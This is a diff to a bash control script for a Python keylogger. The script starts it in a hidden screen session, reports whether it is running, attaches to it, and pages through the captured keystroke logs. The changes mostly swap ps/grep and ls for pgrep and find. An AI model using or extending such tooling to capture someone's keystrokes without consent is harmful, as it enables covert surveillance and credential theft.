@@ -1,6 +1,6 @@
 #!/bin/bash
 
-LOGPATH=/home/$USER/logger
+LOGPATH=$HOME/logger
 BIN=/home/$USER/Desktop/git/keylogger/linux/launch-keylogger.py
 if [ ! -f "$BIN" ]
 then
@@ -22,7 +22,19 @@ function start_kl() {
     screen -AmdS keylogger python3 "$BIN"
 }
 
-proc="$(ps aux | grep keylogger.py | grep -v grep)"
+is_running=0
+if pgrep -f keylogger.py > /dev/null
+then
+    is_running=1
+fi
+
+function show_running() {
+    for proc in $(pgrep -f keylogger.py)
+    do
+        ps o cmd -p "$proc" | tail -n1
+    done
+}
+
 if [ "$1" == "--help" ] || [ "$1" == "-h" ]
 then
     echo "usage: kl [swipe|status|stop|show|i]"
@@ -35,12 +47,12 @@ then
     exit 0
 elif [ "$1" == "start" ]
 then
-    if [ "$proc" == "" ]
+    if [ "$is_running" == "0" ]
     then
         start_kl
     else
         echo "[!] running already:"
-        echo "$proc"
+        show_running
     fi
     exit 0
 elif [ "$1" == "stop" ]
@@ -49,47 +61,46 @@ then
     exit 0
 elif [ "$1" == "show" ]
 then
-    if [ ! -d $LOGPATH ]
+    if [ ! -d "$LOGPATH" ]
     then
         echo  "[-] LOGPATH not found '$LOGPATH'"
         exit 1
     fi
-    latest_log="$(ls "$LOGPATH" | tail -n1)"
-    latest_log="$LOGPATH/$latest_log"
+    latest_log="$(find "$LOGPATH" | tail -n1)"
     if [ ! -f "$latest_log" ]
     then
-        echo "[!] there are no logfiles yet."
+        echo "[!] there are no logfiles yet. $latest_log"
         exit 1
     fi
-    num_logs="$(ls "$LOGPATH" | wc -l)"
+    num_logs="$(find "$LOGPATH" | wc -l)"
     echo "showing latest logfile out of $num_logs logs:"
     echo "$latest_log"
     less "$latest_log"
     exit 0
 elif [ "$1" == "i" ]
 then
-    if [ "$proc" == "" ]
+    if [ "$is_running" == "0"  ]
     then
         echo "[-] not running"
     else
         echo "[+] found:"
-        echo "$proc"
+        show_running
         screen -r keylogger
     fi
     exit 0
 elif [ "$1" == "status" ]
 then
-    if [ "$proc" == "" ]
+    if [ "$is_running" == "0" ]
     then
         echo "[-] not running"
     else
         echo "[+] found:"
-        echo "$proc"
+        show_running
     fi
     exit 0
 elif [ "$1" == "swipe" ]
 then
-    num="$(ls ./*.log | wc -l)"
+    num="$(find . -name "*.log" | wc -l)"
     if [ "$num" == "0" ]
     then
         echo "logs empty already."
@@ -111,7 +122,7 @@ then
     exit 1
 fi
 
-if [ "$proc" == "" ]
+if [ "$is_running" == "0" ]
 then
     start_kl
 else
